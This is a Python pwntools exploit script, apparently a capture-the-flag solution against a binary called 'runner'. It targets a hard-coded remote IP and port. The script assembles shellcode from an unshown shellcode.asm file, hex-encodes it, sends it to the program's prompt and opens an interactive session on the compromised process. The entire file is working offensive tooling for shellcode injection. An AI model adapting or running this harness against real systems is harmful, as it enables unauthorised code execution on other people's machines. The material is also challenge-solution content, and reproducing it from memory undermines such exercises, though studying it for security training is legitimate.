#!/usr/bin/env python3
from pwn import *
from subprocess import run

# =========================================================
#                          SETUP                         
# =========================================================
exe = './runner'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '159.89.193.103', 10002

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

breakrva 0x14bf
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()

    if not args.REMOTE:
        run("nasm -f bin shellcode.asm -o shellcode.bin", shell=True, check=True)
    shellcode = open("shellcode.bin", "rb").read()
    payload = ''.join(f'\\x{byte:02x}' for byte in shellcode)

    log.info("shellcode length: %d", len(payload))
    if len(payload) > 700:
        log.failure("Shellcode too long")
        exit(1)
    io.sendlineafter(b':', payload.encode())

    io.interactive()
    
if __name__ == '__main__':
    exploit()